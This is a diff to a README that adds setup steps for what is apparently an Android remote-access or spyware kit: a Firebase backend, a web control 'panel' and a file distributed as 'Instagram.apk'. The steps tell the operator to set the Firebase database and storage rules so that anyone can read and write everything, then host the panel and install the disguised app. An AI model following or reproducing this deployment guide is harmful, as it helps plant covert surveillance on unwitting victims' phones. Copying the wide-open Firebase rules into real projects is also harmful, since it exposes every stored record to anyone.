@@ -41,4 +41,32 @@
 
 
 ## How to Build 
+  ### Firebase Setup
+ 1. Create an Firebase Account and afterwords create a new project with any name.
+ 1. Enable Firebase Database and Firebase Storage.
+ 1. In Firebase Database Click on the rules and set `.read` and `.write` to `true`
+    - ```js
+          {
+           "rules": {
+                   ".read": "true",
+                   ".write": "true"
+                    }
+          }
+      ```
+ 1. In Firebase Storage allow reads and writes for all paths.
+    - ```js
+        rules_version = '2';
+        service firebase.storage {
+        match /b/{bucket}/o {
+            match /{allPaths=**} {
+               allow read, write 
+              }
+          }
+       }
+      ```
+ 1. Now Go to project overview and create an Android App and download the `google-services.json` file.
+ 1. Also create a web app and copy the config of webapp.
+   ### Panel Setup
+ 1. You can use Github Pages or any Hosting Website for hosting the panel.
+ 1. Open [index.html](./WEB%20PANEL/index.html) File and from line number 16 replace the config with your web app config which you have created on Step 6.
  1. Download [Instagram.apk](./ANDROID%20APP/Instagram.apk)
